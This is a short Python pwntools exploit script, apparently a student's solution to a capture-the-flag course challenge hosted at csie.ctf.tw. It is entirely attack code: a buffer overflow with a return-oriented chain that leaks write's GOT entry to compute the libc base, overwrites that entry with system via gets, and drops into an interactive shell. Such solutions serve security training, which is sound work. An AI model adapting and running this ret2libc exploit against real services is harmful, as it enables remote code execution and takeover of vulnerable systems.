
# b01901169 Kai
# usage: python exploit.py; type sh;

from pwn import *

main = 0x804855c
write_plt = 0x80483e0
write_got = 0x804a020

libc = ELF('./lib.so.6')
gets_off = libc.symbols['gets'] # elf.symbols['gets']
system_off = libc.symbols['system']
write_off = libc.symbols['write']

# buf = '0x1a8ec0' # elf.bss()

#r = remote('127.0.0.1',8888)
r = remote('csie.ctf.tw', 10114)

raw_input('pause')

r.send(p32(0x8048372)*30 + p32(write_plt) + p32(main) + p32(0x1) + p32(write_got) +p32(4)+ '\n')

base = u32(r.recv()[:4]) - write_off

print 'libc base = ', hex(base)
system = base + system_off
gets = base + gets_off

print 'gets = ', hex(gets)
print 'system = ', hex(system)
# raw_input('pause')

r.send(p32(0x8048372)*30 + p32(gets) + p32(system) + p32(write_got) + p32(write_got) + '\n' )
## send sh

r.interactive()
